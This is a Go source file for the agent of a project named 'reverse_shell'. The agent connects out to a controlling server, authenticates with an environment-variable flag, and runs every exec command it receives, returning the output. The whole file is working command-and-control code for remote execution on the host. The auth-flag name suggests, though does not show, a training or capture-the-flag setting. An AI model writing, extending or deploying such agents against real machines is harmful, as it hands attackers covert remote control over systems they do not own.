package agent

import (
	"net"
	"os"
	"reverse_shell/pkg/common"
	"reverse_shell/pkg/protocol"

	"runtime"

	"go.uber.org/zap"
)

type Client struct {
	Conn      net.Conn
	Codec     *protocol.Codec
	SessionID string
	ID        string
	Done      chan struct{}
	logger    *zap.Logger
}

func Run(addr string, caFile, serverName string, logger *zap.Logger) (*Client, error) {
	conn, err := ConnectLoop(addr, caFile, serverName, logger)
	if err != nil {
		return nil, err
	}
	codec := protocol.NewCodec(conn)

	client := &Client{
		Conn:      conn,
		Codec:     codec,
		SessionID: "x",
		ID:        common.GenerateID(),
		Done:      make(chan struct{}),
	}
	logger.Info("Client started")

	authPayload := os.Getenv("AGENT_AUTH_FLAG")

	message := protocol.Message{
		Type:      protocol.MsgAuth,
		Payload:   authPayload,
		ID:        common.GenerateID(),
		SessionID: "x",
		Meta: map[string]string{
			"version":  protocol.ProtocolVersion,
			"platform": runtime.GOOS,
		},
	}
	if err := codec.Send(message); err != nil {
		return nil, err
	}
	logger.Info("[+] Agent connected")

	go client.readLoop(logger)

	return client, nil
}

func (c *Client) readLoop(logger *zap.Logger) {
	defer c.Conn.Close()
	defer close(c.Done)
	for {
		msg, err := c.Codec.Read()
		if err != nil {
			logger.Error("Error reading message:", zap.Error(err))
			c.Conn.Close()
			return
		}
		logger.Info("Received message", zap.String("payload", msg.Payload))
		c.handle(msg, logger)
	}
}

func (c *Client) handle(msg protocol.Message, logger *zap.Logger) {
	switch msg.Type {
	case protocol.MsgHello:
		logger.Info("[+] Server responded with hello")
		logger.Info("[+] Connection established")
	case protocol.MsgAuth:
		logger.Info("[+] Server requested authentication")
		c.SessionID = msg.SessionID
		logger.Info("[+] Session ID set to:", zap.String("session_id", c.SessionID))
		logger.Info("[+] Authentication successful")
	case protocol.MsgPing:
		logger.Info("[+] Received ping")
		response := protocol.Message{
			Type:      protocol.MsgPong,
			ID:        common.GenerateID(),
			SessionID: msg.SessionID,
			Meta: map[string]string{
				"version":  protocol.ProtocolVersion,
				"platform": runtime.GOOS,
			},
			Payload: "Pong",
		}
		if err := c.Codec.Send(response); err != nil {
			logger.Error("Error sending response:", zap.Error(err))
		}
	case protocol.MsgExec:
		logger.Info("[+] Received command:", zap.String("command", msg.Payload))
		go func() {
			output, err := ExecuteCommand(string(msg.Payload))
			if err != nil {
				logger.Error("Error executing command:", zap.Error(err))
				responseErr := protocol.Message{
					Type:      protocol.MsgError,
					Payload:   err.Error(),
					ID:        common.GenerateID(),
					SessionID: msg.SessionID,
					Meta: map[string]string{
						"version":  protocol.ProtocolVersion,
						"platform": runtime.GOOS,
					},
				}
				if err := c.Codec.Send(responseErr); err != nil {
					logger.Error("Error sending error response:", zap.Error(err))
				}
			} else {
				response := protocol.Message{
					Type:      protocol.MsgResult,
					Payload:   output,
					ID:        common.GenerateID(),
					SessionID: msg.SessionID,
					Meta: map[string]string{
						"version":  protocol.ProtocolVersion,
						"platform": runtime.GOOS,
					},
				}
				if err := c.Codec.Send(response); err != nil {
					logger.Error("Error sending command output:", zap.Error(err))
				}
			}
		}()
	default:
		logger.Info("[+] Unknown message type:", zap.String("type", msg.Type))
	}
}
